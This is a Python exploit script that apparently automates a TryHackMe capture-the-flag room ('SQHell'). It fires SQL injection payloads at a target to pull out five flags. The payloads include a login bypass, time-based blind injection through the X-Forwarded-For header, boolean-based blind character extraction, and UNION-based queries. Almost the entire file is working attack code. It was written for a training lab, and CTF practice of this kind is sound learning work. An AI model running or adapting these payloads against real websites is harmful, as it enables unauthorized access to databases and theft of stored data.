#!/usr/bin/python3
import sys
import requests
import string
import os
import time

def banner():
    os.system('clear')
    print (f"""\033[1;31;40m\n                                                                                               
@@@@@@@ @@@  @@@ @@@@@@@@@@      @@@@@@  @@@@@@   @@@  @@@ @@@@@@@@ @@@      @@@      
  @!!   @@!  @@@ @@! @@! @@!    !@@     @@!  @@@  @@!  @@@ @@!      @@!      @@!      
  @!!   @!@!@!@! @!! !!@ @!@     !@@!!  @!@  !@!  @!@!@!@! @!!!:!   @!!      @!!      
  !!:   !!:  !!! !!:     !!:        !:! !!:!!:!:  !!:  !!! !!:      !!:      !!:      
   :     :   : :  :      :      ::.: :   : :. ::: :   : : : :: ::  : ::.: : : ::.: : 
                                    
~by \033[1;37;40m0x0000                              \033[1;31;40mTHM Profile: \033[1;37;40mhttps://tryhackme.com/p/0x0000\n\n
\033[1;31;40mUsage:\033[1;37;40m      {sys.argv[0]} MACHINE_IP:PORT\n
\033[1;31;40mCTF Room:\033[1;37;40m   https://tryhackme.com/room/sqhell \n\n\033[1;37;40m""")

def main(addr):
    banner()
    charset = string.ascii_uppercase + string.digits + "{:}"

    # Retrieve Flag 1

    url = f"http://{addr}/login"

    data = {
        'username' : "\' OR 1=1 -- -",
         'password' : ' '
        } 

    resp = requests.post(url, data=data)
    
    content = (resp.text)
    splitted = content.find('}')
    FLAG1 = ((content[(splitted-42):]).split('<'))[0]


    

    # Retrieve Flag 2
    flag = ""
    
    for i in range(1, 44):
        for c in charset:
            
            payload = f"1' AND (SELECT sleep(2) FROM flag where SUBSTR(flag,{i},1) = '{c}') and '1'='1"
            headers = {'X-Forwarded-For':payload}

            banner()
            print(f"[\033[1;31;40m+\033[1;37;40m] FLAG1: \033[1;31;40m{FLAG1}\n")
            print("\033[1;37;40mFLAG2")
            print ("Type: Time Based")
            print ("Offset: ", i)
            print("Extracting:\033[1;31;40m", flag+c)
            print("\033[1;37;40mPayload:", payload)

            start = time.time()
            r = requests.get(f"http://{addr}", headers = headers)
            stop = time.time()

            if stop-start >= 2:
                flag += c
                break
        FLAG2 = flag
    



    # Retrieve Flag 3
    flag = ""
    for i in range(1, 44):
        for c in charset:
            r = requests.get(f"http://{addr}/register/user-check?username=admin' AND (SUBSTR((SELECT flag FROM flag LIMIT 0,1), {i},1)) = '{c}' ;-- -")
            banner()
            print(f"\033[1;37;40m[\033[1;31;40m+\033[1;37;40m] FLAG1:\033[1;31;40m {FLAG1}")
            print(f"\033[1;37;40m[\033[1;31;40m+\033[1;37;40m] FLAG2:\033[1;31;40m {FLAG2}\n")
            print("\033[1;37;40mFLAG3")
            print("Type: Boolean based")
            print ("Offset: ", i)
            print("\033[1;37;40mExtracting:\033[1;31;40m", flag+c)
            print(f"\033[1;37;40mPayload: admin' AND (SUBSTR((SELECT flag FROM flag LIMIT 0,1), {i},1)) = '{c}' ;-- -")
            if 'false' in r.text:
                flag += c
                break
        FLAG3 = flag



    # Retrieve Flag 4

    r = requests.get(f"http://{addr}/user?id=2 union select \"2 union select null,flag,null,null from flag\",null,null; -- -")
    content = (r.text)
    splitted = content.find('}')
    FLAG4 = ((content[(splitted-42):]).split('<'))[0]
    
    banner()
    print(f"\033[1;37;40m[\033[1;31;40m+\033[1;37;40m] FLAG1:\033[1;31;40m {FLAG1}")
    print(f"\033[1;37;40m[\033[1;31;40m+\033[1;37;40m] FLAG2:\033[1;31;40m {FLAG2}")
    print(f"\033[1;37;40m[\033[1;31;40m+\033[1;37;40m] FLAG3:\033[1;31;40m {FLAG3}")
    print(f"\033[1;37;40m[\033[1;31;40m+\033[1;37;40m] FLAG4:\033[1;31;40m {FLAG4}")



    # Retrieve Flag 5

    r = requests.get(f"http://{addr}/post?id='' UNION ALL SELECT 1,2,group_concat(flag),4 from sqhell_5.flag --")
    content = (r.text)
    splitted = content.find('}')
    FLAG5 = ((content[(splitted-42):]).split('<'))[0]
    
    banner()
    print(f"\033[1;37;40m[\033[1;31;40m+\033[1;37;40m] FLAG1:\033[1;31;40m {FLAG1}")
    print(f"\033[1;37;40m[\033[1;31;40m+\033[1;37;40m] FLAG2:\033[1;31;40m {FLAG2}")
    print(f"\033[1;37;40m[\033[1;31;40m+\033[1;37;40m] FLAG3:\033[1;31;40m {FLAG3}")
    print(f"\033[1;37;40m[\033[1;31;40m+\033[1;37;40m] FLAG4:\033[1;31;40m {FLAG4}")    
    print(f"\033[1;37;40m[\033[1;31;40m+\033[1;37;40m] FLAG5:\033[1;31;40m {FLAG5}")


if __name__ == "__main__":
    if len(sys.argv) == 1:
        banner()
        sys.exit(0)
    main(sys.argv[1])
